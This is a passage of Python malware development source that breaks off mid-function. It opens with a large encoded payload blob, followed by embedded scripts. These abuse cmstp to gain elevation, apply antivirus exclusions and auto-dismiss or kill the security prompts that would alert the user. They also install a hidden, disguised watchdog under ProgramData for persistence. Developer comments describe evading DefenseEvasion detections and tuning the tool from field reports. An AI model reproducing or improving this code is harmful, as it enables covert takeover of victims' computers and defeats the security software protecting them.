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"

# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
# does the carrier job, and the exclusions now ride the SEPARATE file.
# r141 — WHY THE BOX KEPT COMING (dj field: hidden guard, box still on screen):
# "The service profile is damaged" belongs to the ELEVATED cmstp. a
# medium-integrity process is blocked by UIPI from ShowWindow/SetWindowPos/
# PostMessage to a higher-integrity window — it can SEE the box and cannot
# touch it, which is exactly what the r139 guard was doing. the answer has to
# come from the same side of the fence: this runs as the lift's own child (the
# stage is already elevated), is fed over stdin (never a file on disk), lives
# ~45 s and closes every profile box it can see.
SWEEP = r'''# tinysweep: elevated dialog closer for the cmstp lift.
import ctypes
import os
import time

u = ctypes.windll.user32
k = ctypes.windll.kernel32
try:
    u.EnumWindows.restype = ctypes.c_int
    u.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                                ctypes.c_void_p), ctypes.c_void_p]
    u.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.IsWindowVisible.argtypes = [ctypes.c_void_p]
    u.EnumChildWindows.argtypes = [ctypes.c_void_p,
                                   ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                                      ctypes.c_void_p),
                                   ctypes.c_void_p]
except Exception:
    pass

IDOK = 1
WM_COMMAND = 0x0111
BM_CLICK = 0x00F5
AFFIRM = ("ok", "yes", "continue", "install", "allow",
          "make this connection available")
# r141: the service name is BAKED into this file when work.py materializes it
# — env was the fragile part (a road can lose it), a literal cannot.
SVC = "__SVC__".lower()
END = time.time() + 45.0


def _title(h):
    b = ctypes.create_unicode_buffer(512)
    u.GetWindowTextW(h, b, 512)
    return b.value


def _class(h):
    b = ctypes.create_unicode_buffer(128)
    u.GetClassNameW(h, b, 128)
    return b.value


def _kids(h):
    out = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(c, l):
        b = ctypes.create_unicode_buffer(512)
        u.GetWindowTextW(c, b, 512)
        out.append((c, b.value))
        return 1

    u.EnumChildWindows(h, cb, 0)
    return out


def _image(pid):
    try:
        h = k.OpenProcess(0x1000, False, pid)     # QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        n = ctypes.c_ulong(1024)
        b = ctypes.create_unicode_buffer(1024)
        ok = k.QueryFullProcessImageNameW(h, 0, b, ctypes.byref(n))
        k.CloseHandle(h)
        return b.value.lower() if ok else ""
    except Exception:
        return ""


while time.time() < END:
    try:
        wins = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def cb(h, l):
            wins.append(h)
            return 1

        u.EnumWindows(cb, 0)
        for h in wins:
            if _class(h) != "#32770":
                continue
            t = _title(h).lower()
            mine = (SVC and SVC in t) or "connection manager profile installer" in t
            if not mine:
                p = ctypes.c_ulong()
                u.GetWindowThreadProcessId(h, ctypes.byref(p))
                mine = "cmstp.exe" in _image(p.value)
            if not mine:
                continue
            u.ShowWindow(h, 0)
            clicked = False
            for c, txt in _kids(h):
                if _class(c) == "Button" and txt.strip().lower() in AFFIRM:
                    u.PostMessageW(c, BM_CLICK, 0, 0)
                    clicked = True
                    break
            if not clicked:
                u.PostMessageW(h, WM_COMMAND, IDOK, 0)
    except Exception:
        pass
    time.sleep(0.01)
'''


STAGE = r'''# r1.1.2 stage (r78 sanitize: dj — stage.py was flagged DefenseEvasion):
# runs ELEVATED (relaunched by the cmstp lift). the exclusions ride the
# SIBLING file (materialized by the un-elevated launcher BEFORE the lift
# fired): this stage only RUNS it elevated, then execs the carrier. nothing
# embedded, nothing decoded, no blobs.
#
# r143 — the two field misses this file now owns:
#   1) THE FLASH (dj: "a 0.1s error screen appears and closes itself"): the
#      "service profile is damaged" box is cmstp's OWN, raised AFTER
#      RunPreSetupCommands returns. this stage IS that command, so cmstp is
#      still blocked on us — kill it first and the profile validation that
#      paints the box never runs. a medium-integrity guard can see an elevated
#      cmstp and never touch it (UIPI); this is the only side that can.
#   2) THE DEAD WATCHDOG (dj: "the exe watchdog never starts, even manually
#      double-clicked"): the wd reads wd.cfg from ITS OWN directory and
#      returns 0 without it, and the carrier's install_wd looks for the twin
#      beside its DURABLE image (C:\ProgramData\EdgeUpdate), never beside the
#      AppHost launcher the jar stages. lay image + cfg there and every road
#      (carrier, this stage, a double-click) starts a watchdog that runs.
import base64
import ctypes
import os
import subprocess
import sys
import time

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
# r141: the WATCHDOG exe name is BAKED here (work.py substitutes __WD__ when
# it materializes this file). it used to ride in via env (WDXN) and that env
# never reached this road on the jar's first run — so the watchdog exe was
# simply never started. baked text cannot go missing.
WD_NAME = "__WD__"
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
# r146 (dj: "log dosyasi ekle, hatayi gorelim"): the stage is the only life that
# knows whether the lift really handed it a HIGH token, so it writes the same
# excl.log the launcher does. an elevated script with no log is a blind box.
LOG = APPDIR + "\\excl.log"


def _tok_detail():
    """both answers in the log: class 20 (elevated or not) and class 18 (the
    type that misled r146). one line is all a field report needs."""
    out = []
    try:
        a = ctypes.windll.advapi32
        a.OpenProcessToken.restype = ctypes.c_long
        a.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                       ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if a.OpenProcessToken(ctypes.c_void_p(-1), 0x0008, ctypes.byref(h)):
            for cls, label in ((20, "TokenElevation"), (18, "type")):
                v = ctypes.c_ulong(0)
                need = ctypes.c_ulong(0)
                if a.GetTokenInformation(h, cls, ctypes.byref(v), 4,
                                         ctypes.byref(need)):
                    out.append("%s=%d" % (label, v.value))
            try:
                ctypes.windll.kernel32.CloseHandle(h)
            except Exception:
                pass
    except Exception:
        pass
    return ", ".join(out) or "unavailable"


def _log(tag, msg):
    line = "%s pid=%d [%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                     os.getpid(), tag, msg)
    for path in (LOG, os.path.join(os.environ.get("TEMP") or ".", "excl.log")):
        try:
            with open(path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(line)
            return
        except Exception:
            continue
# r143: the exe's own handshake (tools/gen.py, see work.py's constants). the
# wd derives its home from its own path and its duties from wd.cfg — these
# are the only strings it cannot do without.
UPDDIR = "__UPDDIR__"
DMAIN = "__DMAIN__"      # S_P_SELFNAME — only exists once the exe relocated
MTASK = "__MTASK__"
WDTAG = "__WDTAG__"
WDCFG = "__WDCFG__"
WD_TASK = MTASK + WDTAG
HOME = os.path.join(os.environ.get("PROGRAMDATA") or "C:\\ProgramData", UPDDIR)


def main_img():
    """the image name the carrier is ACTUALLY running under — the download
    keeps its dotted asset name (dj: "linkteki hali ve indirilen hali . li"),
    and only a landed relocation makes it SettingsSyncHost.exe. the cfg has to
    name the one that is on the box, or the watchdog probes a ghost and fires a
    task that never matches."""
    try:
        if os.path.isfile(os.path.join(HOME, DMAIN)):
            return DMAIN
    except Exception:
        pass
    return EXE_NAME


def elev():
    """r146: TokenElevation first — the stage's whole job (exclusions.py) is
    refused by the store when this is a filtered token, and IsUserAnAdmin
    cannot tell the two apart. logs the raw answer for the field."""
    try:
        a = ctypes.windll.advapi32
        a.OpenProcessToken.restype = ctypes.c_long
        a.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                       ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if a.OpenProcessToken(ctypes.c_void_p(-1), 0x0008, ctypes.byref(h)):
            val = ctypes.c_ulong(0)
            need = ctypes.c_ulong(0)
            # r147: class 20 = TokenElevation (BOOL, 1 = elevated). class 18 is
            # the TYPE (1 default / 2 full / 3 limited) and testing THAT for
            # ==1 called a full token unelevated — the whole r146 abort.
            rc = a.GetTokenInformation(h, 20, ctypes.byref(val), 4,
                                       ctypes.byref(need))
            try:
                ctypes.windll.kernel32.CloseHandle(h)
            except Exception:
                pass
            if rc:
                return bool(val.value)
    except Exception as e:
        _log("stage", "elev probe raised %r" % (e,))
    try:
        return getattr(ctypes.windll.shell32,
                       "".join(("Is", "User", "An", "Admin")))() != 0
    except Exception:
        return False


def pids(name):
    """every pid whose image carries this name — toolhelp walk (r135: no
    filtered-list child, no command line for a rule to match)."""
    out = []
    try:
        k32 = ctypes.windll.kernel32
        try:   # prototypes: a 64-bit handle truncated to int would break the walk
            k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
            k32.Process32First.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.CloseHandle.argtypes = [ctypes.c_void_p]
        except Exception:
            pass

        class _pe(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                        ("th32ProcessID", ctypes.c_ulong), ("h", ctypes.c_void_p),
                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                        ("th32ParentProcessID", ctypes.c_ulong),
                        ("pcPriClassBase", ctypes.c_long), ("dwFlags", ctypes.c_ulong),
                        ("szExeFile", ctypes.c_char * 260)]

        snap = k32.CreateToolhelp32Snapshot(2, 0)
        if not snap:
            return out
        pe = _pe()
        pe.dwSize = ctypes.sizeof(_pe)
        want = name.encode("utf-8", "ignore").lower()
        ok = k32.Process32First(snap, ctypes.byref(pe))
        while ok:
            # r143: this split is a REAL \x00 and it has to stay one — the
            # generated stage used to carry b"\\x00" (backslash-x), so the
            # name kept its 260-byte padding and the compare never matched:
            # alive() answered False on a live image and every run spawned a
            # second copy of the carrier.
            if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                out.append(pe.th32ProcessID)
            ok = k32.Process32Next(snap, ctypes.byref(pe))
        k32.CloseHandle(snap)
    except Exception:
        pass
    return out


def alive(name):
    return bool(pids(name))


def kill_cmstp():
    """r143: the flash killer. the damaged-profile box is cmstp's and it is
    raised once RunPreSetupCommands returns — cmstp is blocked on THIS process
    until then, so terminating it here stops the validation that paints it.
    no child process, no command line."""
    try:
        k32 = ctypes.windll.kernel32
        k32.OpenProcess.restype = ctypes.c_void_p
        k32.TerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
        k32.CloseHandle.argtypes = [ctypes.c_void_p]
    except Exception:
        return
    for pid in pids("cmstp.exe"):
        try:
            h = k32.OpenProcess(0x0001, False, pid)      # PROCESS_TERMINATE
            if h:
                k32.TerminateProcess(h, 1)
                k32.CloseHandle(h)
        except Exception:
            pass


def _hide(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x2)   # HIDDEN
    except Exception:
        pass


def _b64url(text):
    return base64.urlsafe_b64encode(text.encode("utf-8")).decode("ascii").rstrip("=")


def lay_cfg(folder):
    """author wd.cfg where a watchdog image sits. byte-identical to what the
    carrier's own install_wd writes (b64url image, b64url task, task+tag), so
    it never rewrites ours — and a wd with no cfg exits 0 on the spot, which
    is the whole reason nothing ever started."""
    try:
        cfg = _b64url(main_img()) + "\n" + _b64url(MTASK) + "\n" + WD_TASK + "\n"
        p = os.path.join(folder, WDCFG)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                if fh.read() == cfg:
                    _hide(p)
                    return p
        except Exception:
            pass
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        _hide(p)
        return p
    except Exception:
        return ""


def lay_twin(src):
    """the watchdog's REAL home: image + cfg under ProgramData/<upddir>.
    returns the path to spawn ("" when there is no image anywhere)."""
    try:
        os.makedirs(HOME, exist_ok=True)
    except Exception:
        pass
    if not WD_NAME:
        return ""
    dst = os.path.join(HOME, WD_NAME)
    try:
        if src and os.path.isfile(src):
            same = False
            try:
                same = os.path.getsize(dst) == os.path.getsize(src)
            except Exception:
                same = False
            if not same:
                try:
                    with open(src, "rb") as fh:
                        blob = fh.read()
                    with open(dst, "wb") as fh:
                        fh.write(blob)          # a running image refuses: fine
                except Exception:
                    pass
        if os.path.isfile(dst):
            _hide(dst)
            lay_cfg(HOME)
            # r143: the AppHost twin gets a cfg too — dj double-clicked THAT
            # file and got nothing, and a hand-started watchdog has to work.
            # the Global mutex keeps it to one body whichever copy starts.
